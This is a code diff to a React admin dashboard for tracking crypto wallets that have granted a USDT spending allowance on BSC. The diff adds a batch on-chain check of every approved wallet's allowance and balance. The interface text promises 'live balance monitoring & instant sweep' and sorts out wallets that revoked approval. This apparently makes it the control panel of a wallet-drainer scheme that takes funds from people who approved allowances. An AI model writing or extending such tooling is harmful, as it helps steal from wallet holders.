@@ -40,6 +40,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
   const [walletFilter, setWalletFilter] = useState<WalletFilter>('approved');
   const [checkingAllowanceId, setCheckingAllowanceId] = useState<string | null>(null);
   const [isCheckingAllAllowances, setIsCheckingAllAllowances] = useState(false);
+  const [isCheckingAllApproved, setIsCheckingAllApproved] = useState(false);
   const [checkSuccessMsg, setCheckSuccessMsg] = useState<string | null>(null);
 
   // ── Security: Inactivity auto-logout ─────────────────────────────
@@ -119,6 +120,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
     markWalletUnapproved,
     checkWalletAllowanceOnChain,
     checkAllUnapprovedOnChain,
+    checkAllApprovedOnChain,
     isLoading: metricsLoading,
     error: metricsError,
   } = useAdminData();
@@ -196,6 +198,29 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
       console.error('Allowance check error:', err);
     } finally {
       setCheckingAllowanceId(null);
+    }
+  };
+
+  // ── Batch on-chain allowance & balance check for ALL approved wallets ────
+  const handleCheckAllApproved = async () => {
+    setIsCheckingAllApproved(true);
+    setCheckSuccessMsg(null);
+    try {
+      const res = await checkAllApprovedOnChain();
+      if (res.revokedCount > 0) {
+        setCheckSuccessMsg(
+          `RPC scan complete: Checked ${res.checkedCount} approved wallet(s). ${res.stillConnectedCount} still connected & updated. ${res.revokedCount} revoked approval (moved to Non-Approved)!`
+        );
+      } else {
+        setCheckSuccessMsg(
+          `RPC scan complete: Checked ${res.checkedCount} approved wallet(s). All ${res.stillConnectedCount} are still connected with active allowance. Balances updated!`
+        );
+      }
+      setTimeout(() => setCheckSuccessMsg(null), 8000);
+    } catch (err) {
+      console.error('Check all approved on-chain error:', err);
+    } finally {
+      setIsCheckingAllApproved(false);
     }
   };
 
@@ -622,8 +647,24 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                   </button>
                 </div>
 
-                {/* Right controls: Batch RPC Check (in non-approved view) + Live Refresh */}
+                {/* Right controls: Batch RPC Check (in approved & non-approved view) + Live Refresh */}
                 <div className="flex items-center gap-2.5">
+                  {walletFilter === 'approved' && (
+                    <button
+                      id="check-all-approved-onchain-btn"
+                      onClick={handleCheckAllApproved}
+                      disabled={isCheckingAllApproved || approvedWallets.length === 0}
+                      className="flex items-center gap-1.5 px-3.5 py-2 rounded-xl border border-emerald-500/40 bg-emerald-500/10 hover:bg-emerald-500/20 text-xs font-semibold text-emerald-300 hover:text-white transition-all cursor-pointer disabled:opacity-50"
+                      title="Check on-chain USDT allowance and update balances on BSC RPC node for all approved wallets"
+                    >
+                      <RefreshCw
+                        className={`w-3.5 h-3.5 ${isCheckingAllApproved ? 'animate-spin text-emerald-400' : 'text-emerald-400'
+                          }`}
+                      />
+                      <span>{isCheckingAllApproved ? 'Scanning Node…' : 'Check All On-Chain'}</span>
+                    </button>
+                  )}
+
                   {walletFilter === 'unapproved' && (
                     <button
                       id="check-all-onchain-btn"
@@ -659,7 +700,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                 {walletFilter === 'all'
                   ? 'Viewing all connected wallets. Live balance monitoring & instant sweep active.'
                   : walletFilter === 'approved'
-                    ? 'Live balance monitoring & instant sweep. Newly connected & latest swept appear on top.'
+                    ? 'Live balance monitoring & instant sweep. Click Check All On-Chain to verify active connections & refresh balances.'
                     : 'Wallets that have not granted on-chain allowance or revoked approval. Click Check On-Chain or Check All On-Chain to re-verify.'}
               </p>
 
